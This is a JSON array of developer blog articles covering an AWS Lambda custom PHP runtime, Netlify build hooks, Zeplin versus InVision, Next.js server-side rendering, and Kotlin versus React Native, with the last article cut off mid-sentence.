[
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tLate in 2018 AWS released Lambda Layers and custom runtime support. This means that to run unsupported runtimes you no longer need to \u2018hack\u2019 around with VMs, docker or using node.js to `exec` your binary.\nRecently I needed to\u00a0setup\u00a0a 100% serverless PHP infrastructure for a client. PHP is one option, but similar steps can allow you to run any language.\nLambda layers provide shared code between different lambda functions. For instance, if you wanted to share your vendor code between lambdas (e.g. node_modules for node.js).\nWe will create a Lambda layer to provide the PHP binary for our custom runtime API. You could also create a second to provide the vendor folder for composer dependencies.\n# Step 1: Compiling the\u00a0PHP\u00a0binary\nWe will need a `/bin` directory containing the PHP binary. Because we are compiling a binary this step needs to happen on the same OS and architecture that our Lambda will use.\n\nThis page\u00a0lists the AWS Execution environment, but last time I checked their version was out of date.\nTo find the correct AMI I used the latest version for the region I was deploying in, found here\u00a0by a quick regex for AMIs containing `amzn-ami-hvm-.*-gp2`.\n\nOnce you have the correct AMI, spin up a large EC2 instance and `ssh` in.\nRun the following commands as listed in AWS\u2019s docs.\n\r\nsudo yum update -y\r\nsudo yum install autoconf bison gcc gcc-c++ libcurl-devel libxml2-devel -y\r\n\r\ncurl -sL http://www.openssl.org/source/openssl-1.0.1k.tar.gz | tar -xvz\r\ncd openssl-1.0.1k\r\n./config && make && sudo make install\r\ncd ~\r\n\r\nmkdir ~/php-7-bin\r\ncurl -sL https://github.com/php/php-src/archive/php-7.3.0.tar.gz | tar -xvz\r\ncd php-src-php-7.3.0\r\n\r\n./buildconf --force\r\n./configure --prefix=/home/ec2-user/php-7-bin/ --with-openssl=/usr/local/ssl --with-curl --with-zlib\r\nmake install\r\n\nCheckpoint:\u00a0The following should give\u00a0you the version number of PHP you wanted\n /home/ec2-user/php-7-bin/bin/php -v \nMove this into a `/bin` directory.\n`mkdir './bin && mv php ./bin\nNow we can zip up the code for our Lambda layer that will provide our custom runtime API.\nzip -r runtime.zip bin bootstrap\n# Vendor files\nOn the same EC2, we need to use composer to get our vendor code.\ncurl -sS https://getcomposer.org/installer | ./bin/php`\nAdd some vendor code:\n./bin/php composer.phar require guzzlehttp/guzzle\n\u00a0\nzip -r vendor.zip vendor/\n\u00a0# Bring down to local\nNow use `scp` to copy the PHP binary down to your local machine:\n\u2013 From local:\nscp {YOUR EC2}:/home/ec2-user/php-7-bin/bin/runtime.zip .\nNow use `scp` to copy the vendor zip down to your local machine:\n\u2013 From local:\nscp {YOUR EC2}:/home/ec2-user/php-7-bin/bin/vendor.zip .\nDon\u2019t forget to terminate your large EC2 instance\n# Creating a custom runtime API\nTo use a custom runtime AWS requires you specify a bootstrap file which will provide the interface for lambda events. As we will be writing PHP support we can write it in PHP (very meta).\nCreate a `bootstrap` executable:\ntouch ./bootstrap && chmod +x ./bootstrap\nExample adapted from AWS docs\n\r\n#!/opt/bin/php\r\n<?php\r\n\r\n// This invokes Composer's autoloader so that we'll be able to use Guzzle and any other 3rd party libraries we need.\r\nrequire __DIR__ . '/vendor/autoload.php';\r\n\r\n// amzn-ami-hvm-2017.03.1.20170812-x86_64-gp2\r\n\r\nfunction getNextRequest()\r\n{\r\n $client = new \\GuzzleHttp\\Client();\r\n $response = $client->get('http://' . $_ENV['AWS_LAMBDA_RUNTIME_API'] . '/2018-06-01/runtime/invocation/next');\r\n\r\n return [\r\n 'invocationId' => $response->getHeader('Lambda-Runtime-Aws-Request-Id')[0],\r\n 'payload' => json_decode((string) $response->;getBody(), true)\r\n ];\r\n}\r\n\r\nfunction sendResponse($invocationId, $response)\r\n{\r\n $client = new \\GuzzleHttp\\Client();\r\n $client->post(\r\n 'http://' . $_ENV['AWS_LAMBDA_RUNTIME_API'] . '/2018-06-01/runtime/invocation/' . $invocationId . '/response',\r\n ['body' => $response]\r\n );\r\n}\r\n\r\n// This is the request processing loop. Barring unrecoverable failure, this loop runs until the environment shuts down.\r\ndo {\r\n // Ask the runtime API for a request to handle.\r\n $request = getNextRequest();\r\n\r\n // Obtain the function name from the _HANDLER environment variable and ensure the function's code is available.\r\n $handlerFunction = array_slice(explode('.', $_ENV['_HANDLER']), -1)[0];\r\n require_once $_ENV['LAMBDA_TASK_ROOT'] . '/src/' . $handlerFunction . '.php';\r\n\r\n // Execute the desired function and obtain the response.\r\n $response = $handlerFunction($request['payload']);\r\n\r\n // Submit the response back to the runtime API.\r\n sendResponse($request['invocationId'], $response);\r\n} while (true);\r\n\r\n?>\r\n\n\u2013 Note: #!/opt/bin/php links to our /bin/php created earlier.\nManual Deployment\n\nGo to AWS lambda page.\nCreate a function selecting to use a custom runtime.\nCreate a layer called `php` and upload `runtime.zip`.\nCreate a layer called `vendor` and upload `vendor.zip`.\nApply the layers to the function you created in the merge order: 1) runtime, 2) vendor\n\nWriting a handler function\n\r\n\r\nmkdir src\r\n\r\ntouch src/hello.php\r\n\r\n\nAdd some basic function called `hello`:\n\r\n<?php\r\n\r\nfunction hello($data)\r\n{\r\n return \"Hello, {$data['name']}!\";\r\n}\r\n\r\n?>\r\n\nThen zip this up to be uploaded:.\nzip hello.zip src/hello.php\nUpload the function handler zip to the function and change the handler name to the name of the php file without the extension. e.g. hello.php => hello\n\u00a0\n# Automation\nMany of the steps here can be automated once you have compiled your binary. Either by using the AWS API, cloudformation or the `serverless`\u00a0library which supports layers.\n# Other languages\nThese steps should allow any language that can compile on the AWS AMI used by Lambda to be used as your runtime, e.g. Rust.\n\u00a0\nResources:\n\nhttps://aws.amazon.com/amazon-linux-ami/2018.03-release-notes/\nhttps://docs.aws.amazon.com/lambda/latest/dg/lambda-runtimes.html\nhttps://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html\nhttps://aws.amazon.com/blogs/apn/aws-lambda-custom-runtime-for-php-a-practical-example/\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBen Ellerby\r\n  \t\t\t\r\n  \t\t\t\tI'm an Architect Developer, working with startups to launch MVP's and large corporates to deliver in startup speed. \r\n\r\nI'm tech at heart, loving to code, participating in hackathons, guest lecturing as part of the University of Southampton CompSci course and acting as a tech advisor to multiple startups.\r\n\r\nhttps://www.linkedin.com/in/benjaminellerby/  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tA few weeks ago, Nicolas and I launched https://jamstack.paris, a JAMstack website powered by GatsbyJS and hosted on Netlify.\nJAMstack applications\u00a0deliver static websites to end-users with the benefit of high performance and CDN ease and still allow dynamism by sourcing content or data during build time.\n\nOn https://jamstack.paris for example, we collect the number of attendees for our events using Gatsby Source Meetup plugin and this happens on build time.\nThe drawback of this dynamism-on-build approach is that our website may be not synced with real count of attendees until we build the site again.\n\nSo, we wanted a quick way to build the site on Netlify with a simple button on our smartphones, and\u00a0you can have the same setup in less than five minutes, let\u2019s go \ud83d\ude80.\nClaim your build hook on Netlify\nHead on Settings > Build & Deploy > Build hooks\u00a0section on your Netlify dashboard and hit the \u201cAdd build hook\u201d button.\n\nGive an explicit name to your hook, for example\u00a0Smartphone Deploy and copy the curl request Netlify provides to you.\n\nSend\u00a0the build request from your phone\nNow we want to sent this build request from our phone.\nYou are on android \ud83d\udc7e\nHTTP Request Shortcuts\u00a0application is doing exactly that\u00a0and requires no permissions on device, which is good in terms of privacy.\n\n\nYou are on iOS \ud83c\udf4f\nThe native Shortcuts application does the job. Head to the app and create a new shortcut. You will need two actions:\n\nURL\nGet Contents of URL\n\nPaste the URL from Netlify (without curl) in the field of the first action.\nThe second action is also really easy to setup. Just open the Advanced options and change the Method to POST.\nHurray! Now we can deploy from our\u00a0smartphone\u2019s homescreen \ud83d\ude80\nIf you have any suggestions or questions, feel free to add them in the comments. And if you want to speak about JAMstack in Paris, we\u2019d love to get in touch with you. First meetup gathering in Paris on December 18th\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tMatthieu Auger\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tZeplin\u00a0vs\u00a0InVision: I work for a service company as a lead developer and we have been using\u00a0these tools\u00a0on different projects for mockup integration. I teamed up with France Wang, lead designer at BAM, to list the pros and cons and give you our combined point of view on these\u00a0design handoff tools.\n\nTo clarify the need we have on our projects and what we use these platforms for, here is our development workflow:\n\nDesigners make the mockups on\u00a0Sketch\nThey\u00a0import the mockup on Zeplin or InVision along with the assets\n(They add comments for developers to\u00a0explain\u00a0specific behaviours)\nDevs use the platform to inspect mockups and integrate them\n\nUsually there are back-and forth between devs and designers during the mockup integration\u00a0phase (4). Choosing the best tool helps limiting these wastes and frustrations. We focus on these goals for the benchmark. We\u2019ll also share tips on how we use these tools for better\u00a0collaboration.\nDisclaimer: this content is not sponsored by either mentioned parties\nAnd the best tool for mockup integration is\u2026\n\nAfter benchmarking the two solutions, our recommendation would be to use Zeplin,\u00a0as it is more advanced and more convenient for design handoff.\nIf you have the budget (17$-26$/month) do not hesitate! The time you\u2019ll save is worth it. The platform eases knowledge sharing between designers and developer. Consequently the production workflow will be faster and less painful. Happier collaboration yay \\o/! #DevUx\nIf you need prototyping and do user testing, use InVision in addition. Designers can use the same Sketch file for both platforms. Separate tools for separate purposes!\nDetailed Benchmark of Zeplin vs Invision\nHere is a recap of the comparison we made:\n\n\n\n\n\n\n\n\nZeplin\u2019s Pros:\n\nKiller\u00a0features:\n\nAutomatically-generated styleguide linked to the mockups\nCommenting tool\nPixel perfect comparison\n\n\nMost\u00a0complete tool for mockup integration\n\n\n\nInVision\u2019s Pros:\n\nInteresting free plan (as many collaborators as you want)\nMore complete offer if you need prototyping\nWill get the job done\n\n\n\n\n\nZeplin\u2019s Cons:\n\nPlans are more expensive and free plan less interesting if your want several collaborators\n\n\n\nInVision\u2019s Cons\n\nOverall\u00a0less efficient because the platform is multipurpose and the UX is not focused on\u00a0mockup integration.\n\n\n\n\n\nKiller feature: Semi-automatically generated styleguide\nWhy should you use a styleguide?\nUsing a styleguide helps us save time and limit rework. To\u00a0both designers and developers, the styleguide defines a design reference\u00a0(for both UI and UX).\nFor the designers, it helps with\n\nkeeping the product consistent\nsummarising\u00a0all colors, font styles, components used throughout the app\u00a0along as their states (idle, disabled, active, loading, success, error\u2026) and variations\u00a0(primary, secondary, icon only etc\u2026)\nexplaining to the devs each\u00a0component behaviour without having to repeat it on each mock up\n\nFor developers, it serves as\n\na reference of standard color codes, font sizes, font weights to use in the code\na library of components\u00a0with the variations\u00a0and states they can have\na compilation of\u00a0components behaviour so as\u00a0not to forget any cases\n\nStyleguides on Zeplin vs Invision: why Zeplin wins\nZeplin integrates an interface to create a styleguide from imported mockups. The platform detects font properties and colors so the designers can add them to the styleguide easily.\nDesigners can add colors to the styleguide in one click from the mockup and define a name for each\nDesigners can also export individual Sketch Symbols, which will then appear in the styleguide Components section.\nThese components are reused by the designer on several mockups. You can see how the navigation looks like with 2 and 3 tabs.\nComponents and mockup are linked: on the styleguide, the developer can see which mockups use which components. Reciprocally, the developer can also see on\u00a0each mockup which components are used and can click the link to see different component states.\nA link to the component styleguide from a mockup on Zeplin\nDesigners can also share their styleguide publicly to get visibility and reactions.\nOn InVision, \u00a0if you want a styleguide you will need to create one from scratch in Sketch.\u00a0Consequently, there are no links between the styleguide and the mockups, so it is less maintainable (or takes too much time to maintain) and is less visible for the team.\nCommenting the mockup to clarify integration\nComments are an essential feature to hand over extra informations not visible on the mockup or the inspector. They also allow to cover edge cases. Is it scrollable? Vertically centered? Is the size proportional? These pieces of information\u00a0should be left by the designers for the developer to use on integration.\nComments on Zeplin are visible when the developer inspects elements\nWhat makes it best on Zeplin is that comments are visible by default on the inspector\u2019s page. On InVision they are on a separate page, and the users need\u00a0to switch between modes. So they\u00a0can forget they exist. What a pity \nComments on InVision are on a separate page as the Inspector\nSmall plus, Zeplin\u00a0lets you to categorise your comments. However\u00a0the links you attach are not always clickable (is it a bug?)\nAnother\u00a0killer feature for pixel perfect integration\n(Only on Mac) With Zeplin\u00a0desktop\u00a0app, you can generate a transparent overlay of the design to compare to the actual development. Of course if you don\u2019t need this level of accuracy it\u2019s just a wow feature \ud83d\ude09\nThis helps the dev checking that their integration matches exactly the mockup, for the desired screen sizes.\nPop out the mockup in a transparent window and move it over your app to check for differences\nCss properties inspection\nThis is a basic feature that\u00a0both platforms allow, but here is what makes Zeplin\u00a0slightly better:\n\nThe inspector\u2019s panel is more condensed\u00a0because null properties are hidden. So you can check properties more easily without having to scroll down\nCSS has syntaxic coloration\n\n\n\n\n\nZeplin inspector\n\nInVision inspector: opacity and left alignment are not useful to have here as these are default values\n\n\n\nPadding/margin inspect\nIn this battle of Zeplin vs Invision, this is the only\u00a0round where\u00a0Zeplin looses!\nDesigners create groups of elements in Sketch to have blocks containing a label and its value for instance, or an input with its submit button \u2013 just like developers might build their app. Designers use these groups to place blocks on the mockup and build a screen.\nWe tried a little experiment on both platforms. The designer made a table with header and values on Sketch.\nHere is\u00a0what you can see on InVision\u2019s inspector tab\nWe uploaded the Sketch file on InVision. Above is what we could see in the inspector: we were able to select the \u2018Group 5\u2032 containing the invoice number and its value\u00a0\u201901_000001\u2019. So by hovering the adjacent block, we could see the margin in between (48px).\nZeplin\u2019s\u00a0mockup inspection panel\nThen we uploaded the same sketch file on Zeplin: the\u00a0Sketch groups are not replicated on the inspector platform: you cannot select the\u00a0container blocks, only the text elements. Therefore, devs cannot see spacing between blocks easily. They loose the designer\u2019s previous reflection on block cutting and spacing. It\u2019s too bad to have two people do the same work twice!\nThe downside of using groups on the other hand is that it makes small details inspection harder. By experience, InVision\u2019s inspector cursor is less accurate because you hover the groups before the element. You need to zoom in for more accuracy.\nManaging Assets\nManaging assets is equivalent on both platforms. Once the designer has set the export options in Sketch, the developer can download\u00a0it from the inspect page when inspecting an element.\nZeplin vs Invision: on both, developers can pick the file format they want from the available list\nYou can find the list of downloadable assets in a specific section.\nOn InVision, you can see the downloadable assets in the group panel.\nIcon inspection on Invision: on the left panel you can see that the Icon/User is downloadable.\nPrototyping\nWhy many choose InVision is because you can make clickable mockups\u00a0to navigate from a screen to another. You can test the\u00a0prototype with\u00a0the targeted users. Very handy to get feedback before development starts!\nThe downside of using InVision both for prototyping and integration comes when several version of the same mockup conflict. This can occur when mockups include\u00a0features under testing phase. It gets confusing for the developers.\nPricing (updated 27/11/18)\nZeplin\nFree tier: 1 project, no collaboration\nIf you are a service company with several clients,\u00a0your clients cannot create an account and invite you on their project, you\u2019ll need to disconnect and connect to\u00a0the same account.\nStarter: 17$/mo 3 projects \u2013 unlimited collaborators\nGrowing business: 26$/mo \u2013 17 projects \u2013 unlimited collaborators\nOrganization: from 122$/mo with only 16 collaborators, +7$/mo per extra collaborator\nInVision\nFree tier: 1 project \u2013 unlimited collaborators\nStarter: 15$/mo \u2013 3 prototypes\nGrowing business: 25$/mo \u2013 unlimited prototypes\nTeam: 99$/mo unlimited prototypes but only 5 members\nCustom: on demand\nTo go further into benchmarking\nSome other tools like Avocode would also need our attention, notably because of their powerful assets export feature. Framer\u2019s new FramerX tool is also an important player we should pay attention too. Their Beta version is not collaborative yet like Invision or Zeplin, but their prototyping tool based on React components is promising.\nWe at Theodo are building our custom Sketch plugin in order to make it even faster to integrate a component.\nWith Overlay, we can export components from Sketch and get prod ready React/VueJs code.\nGenerate React.js/Vue.js components with full design from Sketch files with Overlay plugin\nConclusion\nAll in all,\u00a0these tools will increase your mockup integration process. Nonetheless, the difference lies in\u00a0subtle details and better user experience.\u00a0That\u2019s what gives\u00a0Zeplin\u00a0the edge over\u00a0InVision.\nHaving developers and designers working together is not easy. Indeed, each profile\u00a0has their own stakes and think differently. We have a lot to learn from each other to deliver the best products. Integrating\u00a0the right tool in our process will make the collaboration much smoother.\nFrance and I have been working together to spread the DevUx culture (yes, DevOps is not the only one). This goes from understanding each other, defining mutual expectations and design collaboratively. More articles are coming!\nDon\u2019t hesitate to share your experience and tips using these tools and more generally on your mockup integration processes \nCredits and Resources\nCover pic\u00a0(more sumo battles there, thank you\u00a0Tomoshi Shiiba\u00a0for your art work)\nZeplin/Sketch gif\u00a0(from an article on how\u00a0The Create Labs\u00a0implemented Sketch & Zeplin in their workflow)\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tYu Ling Cheng\r\n  \t\t\t\r\n  \t\t\t\tLead Developer at Theodo\r\nhttps://www.linkedin.com/in/yulingcheng  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tUsually, we are completely running React.js on client-side: Javascript is interpreted by your browser. The initial html returned by the server contains a placeholder, e.g.\u00a0<div id=\"root\"></div>, and then, once all your scripts are loaded, the entire UI is rendered in the browser. We call it client-side rendering.\nThe problem is that, in the meantime, your visitor sees\u2026 nothing, a blank page!\nLooking for how to get rid of this crappy blank page for a personal project, I discovered Next.js: in my opinion the current best framework for making server-side rendering and production ready React applications.\nWhy SSR (Server-Side Rendering)?\nThis is not the point of this article, but here is a quick sum-up of what server-side rendering can bring to your application:\n\nImprove your SEO\nSpeed up your first page load\nAvoid blank page flicker before rendering\n\nIf you want to know more about it, please read this great article: Benefits of Server-Side Over Client Side Rendering.\nBut let\u2019s focus on the \u201chow\u201d rather than the \u201cwhy\u201d here.\nWhat\u2019s the plan?\nFor this article, I start with a basic app made\u00a0with\u00a0create-react-app. Your own React application is probably using similar settings.\nThis article is split in 3 sections matching 3 server-side-rendering strategies:\n\nHow tomanually upgrade your React app to get\u00a0SSR\nHow to start with Next.js from scratch\nMigrate your existing React app to server-side with Next.js\n\nI won\u2019t go through all the steps, but I will bring your attention on the main points of interesting. I also provide a repository for each of the 3 strategies. As the article is a bit long, I\u2019ve split it in 2 articles, this one will only deal with the first 2 sections. If your main concern is to migrate your app to Next.js, you can go directly to the second article\u00a0(coming soon).\n1) Look how twisted manual SSR is\u2026\n\nIn this part, we will see how to implement Server-side Rendering\u00a0manually on an existing React app. Let\u2019s take the\u00a0create-react-app\u00a0starter code:\n\npackage.json\u00a0for dependencies\nWebpack configuration included\nApp.js\u00a0\u2013 loads React and renders the Hello component\nindex.js\u00a0\u2013 puts all together into a root component\n\nChecking rendering type\nI just added to the code base a simple function\u00a0isClientOrServer\u00a0based on the availability of\u00a0the Javascript object window representing the browser\u2019s window:\nconst isClientOrServer = () => {\r\n  return (typeof window !== 'undefined' && window.document) ? 'client' : 'server';\r\n};\r\n\nso that we display on the page what is rendering the application: server or client.\nTest it by yourself\n\nclone\u00a0this repository\ncheckout the initial commit\ninstall the dependencies with\u00a0yarn\nlaunch the dev server with\u00a0yarn start\nbrowse to\u00a0http://localhost:3000\u00a0to view the app\n\nI am now simulating a \u20183G network\u2019 in Chrome so that we really understand what is going on:\n\nImplementing\u00a0Server-side Rendering\nLet\u2019s fix that crappy flickering with server-side rendering! I won\u2019t show all the code (check the repo to see it in details) but here are the main steps.\nWe first need a node server using Express:\u00a0yarn add express.\nIn our React app, Webpack only loads the src/ folder, we can thus create a new folder named server/ next to it. Inside, create a file\u00a0index.js\u00a0where we use express and a server renderer.\n// use port 3001 because 3000 is used to serve our React app build\r\nconst PORT = 3001; const path = require('path');\r\n\r\n// initialize the application and create the routes\r\nconst app = express();\r\nconst router = express.Router();\r\n\r\n// root (/) should always serve our server rendered page\r\nrouter.use('^/$', serverRenderer);\r\n\nTo render our html, we use a server renderer that is replacing the root component with the built html:\n// index.html file created by create-react-app build tool\r\nconst filePath = path.resolve(__dirname, '..', '..', 'build', 'index.html');\r\n\r\nfs.readFile(filePath, 'utf8', (err, htmlData) => {\r\n  // render the app as a string\r\n  const html = ReactDOMServer.renderToString(<App />);\r\n\r\n  // inject the rendered app into our html\r\n  return res.send(\r\n    htmlData.replace(\r\n      '<div id=\"root\"></div>',\r\n      `<div id=\"root\">${html}</div>`\r\n    )\r\n  );\r\n}\r\n\nThis is possible thanks to\u00a0ReactDOMServer.renderToString\u00a0which fully renders the HTML markup of a page to a string.\nWe finally need an entry point that will tell Node how to interpret our React JSX code. We achieve this with Babel.\nrequire('babel-register')({\r\n  ignore: [ /(node_modules)/ ],\r\n  presets: ['es2015', 'react-app']\r\n});\r\n\nTest it by yourself\n\ncheckout last changes on master branch\ninstall the dependencies with\u00a0yarn\nbuild the application with\u00a0yarn build\ndeclare babel environment in your terminal:\u00a0export BABEL_ENV=development\nlaunch your node server with\u00a0node server/bootstrap.js\nbrowse to\u00a0http://localhost:3001\u00a0to view the app\n\nStill simulating the \u20183G network\u2019 in Chrome, here is the result:\n\nDo not be mistaken, the page is rendered by server. But as soon as the javascript is fully loaded, window.document is available and the\u00a0isClientOrServer()\u00a0function returns\u00a0client.\nWe proved that we can do Server-side Rendering, but what\u2019s going on\u00a0with that React logo?!\nWe\u2019re missing many features\nOur example is a good proof of concept but very limited. We would like to see more features like:\n\nimport images in js files (logo problem)\nseveral routes usage or route management (check\u00a0this article)\ndeal with the\u00a0</head>\u00a0and the metatags (for SEO improvements)\ncode splitting (here is\u00a0an article\u00a0solving the problem)\nmanage the state of our app or use Redux (check this\u00a0great article\n\nand performance is bad on large pages:\u00a0ReactDOMServer.renderToString()\u00a0is a synchronous CPU bound call and can starve out incoming requests to the server. Walmart worked on\u00a0an optimization\u00a0for their e-commerce website.\nIt is possible to make Server-side Rendering\u00a0work perfectly on top of create-react-app, we won\u2019t go through all the painful work in this article. Still, if you\u2019re interested in it, I attached just above some great articles giving detailed explanations.\nSeriously\u2026 Next.js can bring you all these features!\n2) Next.js helps you building server rendered React.js Application\n\nWhat is Next.js?\nNext.js is a minimalistic framework for server-rendered React applications with:\n\na very simple page based routing\nWebpack hot reloading\nautomatic transpilation (with babel)\ndeployment facilities\nautomatic code splitting (loads page faster)\nbuilt in css support\nability to run server-side actions\nsimple integration with Redux using next-redux-wrapper.\n\nGet started in 1 minute\nIn this short example, we are going to see how crazy simple it is to have a server-side rendering app ready with Next.js.\nFirst, generate your package.json with\u00a0npm init\u00a0and install Next.js with\u00a0npm install --save next react react-dom. Then, add a script to your package.json like this:\n\"scripts\": {\r\n  \"dev\": \"next\",\r\n  \"build\": \"next build\",\r\n  \"start\": \"next start\"\r\n}\r\n\nCreate a pages/ folder. Every .js file becomes a route that gets automatically processed and rendered. Add a index.js file in that pages/ folder (with the execution of our\u00a0isClientOrServer\u00a0function):\nconst Index = ({ title = 'Hello from Next.js' }) => (\r\n  <div>\r\n    <h1>{title}</h1>\r\n    <p className=\"App-intro\">\r\n      Is my application rendered by server or client?\r\n    </p>\r\n    <h2><code>{isClientOrServer()}</code></h2>\r\n  </div>\r\n);\r\n\r\nexport default Index;\r\n\nNo need to import any library at the top of our index.js file, Next.js already knows that we are using React.\nNow enter\u00a0npm run dev\u00a0into your terminal and go to\u00a0http://localhost:3000: Tadaaaaa!\n\nRepeat the same operation inside your pages/ folder to create a new page. The url to access it will directly match the name you give to the file.\nYou\u2019re ready to go! You\u2019re already doing SSR. Check the\u00a0documentation on Next.js\u00a0official repository.\nUse create-next-app\nYou want to start a server-side rendered React app, you can now stop using create-react-app, and start using\u00a0create-next-app:\nnpm install -g create-next-app\r\n\r\ncreate-next-app my-app\r\ncd my-app/\r\nnpm run dev\r\n\nThis is all you need to do to create a React app with server-side rendering thanks to Next.js.\nFinally, better than a simple Hello World app, check this\u00a0Hacker News clone\u00a0implementing Next.js. It is fully server-rendered, queries the data over Firebase and updates in realtime as new votes come in.\nVue.js and Nuxt\nYou\u2019re maybe a Vue.js developer. Just after Next.js first release, two french brothers made the same for Vue.js: Nuxt was born! Like Vue, the Nuxt documentation is very clear and you can use the same starter template\u00a0vue-cli\u00a0for you app:\n vue init nuxt-community/starter-template <project-name> \nWhat\u2019s Next? \nHope you liked this article which was mainly written in order to introduce server-side rendering with Next.\nIf you are interested in server-side rendering for your existing React application, in the following, I am going to demonstrate how to migrate your existing create-react-app to Next.js. Coming soon\u2026\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBaptiste Jan\r\n  \t\t\t\r\n  \t\t\t\tWeb Developer @Theodo. I like Vue.js and all the ecosystem growing around.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tKotlin is an object-oriented programming language for making Android apps that uses Java-like syntax with functional programming features. It was created by Jetbrains, the makers of hugely popular IDEs like IntelliJ and PyCharm, and is used by big companies such as Pinterest, Uber, and Atlassian.\nAt Theodo, React Native is the language of choice for building apps. And for good reason. It has a rich ecosystem of libraries to use, hot reloading out of the box, is very similar to React which is a hugely popular web framework, and vitally it allows you to compile your apps to both Android and iOS from just one codebase. But this doesn\u2019t mean that we should necessarily use React Native in every case. I will talk through some examples of why Kotlin might be a better choice in some cases.\nWhy use Kotlin/Java over React Native?\nThere are many reasons why one may choose to write native code for an app rather than React Native. One of the most common I have seen is API support. Many services that have APIs for apps cannot be used fully within React Native. This leads to developers having to write native code to get the functionality they need. This can be tricky to developers who may not have ever written native code. Kotlin, on the other hand, is strongly supported within the Android ecosystem and is interoperable with Java so it has easier access to these APIs. Any API that supports Java 8 can be easily used with Kotlin.\nAnother big reason to prefer native code over React Native is performance. For advanced functionality or heavy computation, the overhead of using React Native can considerably slow down an app. Kotlin, on the other hand, appears and acts totally natively without lag.\nMany of us have suffered through the pain of having to update React or React Native. It can be a long and arduous task. However, with writing Kotlin, each new version is backwards compatible with the last. That means that even legacy code written by previous teams doesn\u2019t have to be rewritten when updating to a new version of Kotlin.\nA big problem with large javascript projects is the errors that can come up due to the lack of typing. This is why many developers choose to integrate Flow or TypeScript to help with this. However, this can be a difficult task, especially if the codebase is already large before you start. Kotlin however is statically typed meaning that there is no need for tools like these to check for type errors.\nAnother benefit of using Kotlin over React Native is that it is fully compatible with Android Studio, and Intellij. This means you can make use of loads of cool features like advanced code completion, the built in debugger, and gradle integration, all while benefitting from a UI that was purpose built for making Android apps.\nWhy use Kotlin instead of Java?\nKotlin was created by JetBrains as an attempt to be a more concise and feature-rich version of Java, whilst being designed primarily for Android app development. I understand that writing native code can feel intimidating to many people who have only written Javascript or Python before, but I see Kotlin as a good stepping stone; it has the benefits of writing native code but it will feel more familiar in its functional aspects such as spread, deconstruction, and closures.\nKotlin can also be used to write iOS applications. This is a great benefit when writing applications for both iOS and Android as the application logic can be shared between the two. However, the rendering code is platform specific and thus must be rewritten for each.\nA great thing about Kotlin is that it\u2019s fully compatible with Java. This means that Java code can be inserted into it, or it can be inserted into a Java codebase. This can be helpful if you have a large codebase of legacy code written in Java which you need to add new features to.\nKotlin has all the features of Java 8, plus more. This means you get lambda functions, static functions, streams and nested classes from Java 8, on top of immutable variables, method references, methods without classes, extension methods to classes, closures, spread and deconstruction. As well as all this, built in @Nullable and @NonNull mean that there are no Null-Pointer Exceptions which comes as a great relief to those who are apprehensive to get started writing native code.\nWriting Kotlin, you can use any library that is compatible with Java 8. As well as this, Kotlin has a lot of libraries written for it such as kotlinx-coroutines-android and rxkotlin for writing asynchronous and event-based programs, just to name a few. Whilst still perhaps not as many libraries as React Native might have, there are still a huge number of libraries to take advantage of when writing Kotlin.\nDrawbacks of using Kotlin/Java over React Native\nSadly no tool is perfect and there are many reasons why you may choose to go for React Native over native code. The main reason is iOS compatibility. Yes, Kotlin code can be compiled to objective C, and is bi-directionally interoperable with Objective-C and Swift. But you still have to write separate render code for iOS and Android. This could take a long time and is the main reason why one would choose React Native.\nAnother big reason is that writing React allows hot reloading straight out of the box. While Kotlin does allow for hot reloading, it can be a pain to set up and work unreliably. Hot reloading can really speed up development and if you\u2019re used to having it you may sorely miss it if you can\u2019t get it working for Kotlin development.\nConclusion\nIf you want to get the best of both worlds, it is possible to use React Native to implement the frontend code and Kotlin to implement the backend of your application. This means that you get the speed improvements and Java-compatible API integration of Kotlin, but only have to write one codebase for both Android and iOS. As well as this, you can make use of the front-end libraries available to React Native.\nJetBrains have created a library called kotlin-wrappers which contains wrappers to use Kotlin with React, Redux, styled-components, and React Router DOM, amongst others. There are also a few other libraries online which do similar things.\nThis is a very new field and there are not many people using it just yet, so there may be some teething issues. One possible problem is that passing the store via props to the component won\u2019t work because the state will become immutable. There may be libraries to help with this, and if not then I\u2019m sure there soon will be, but this could be a big pain point.\nThis emerging combination of languages looks like a really new, interesting addition to our use of React 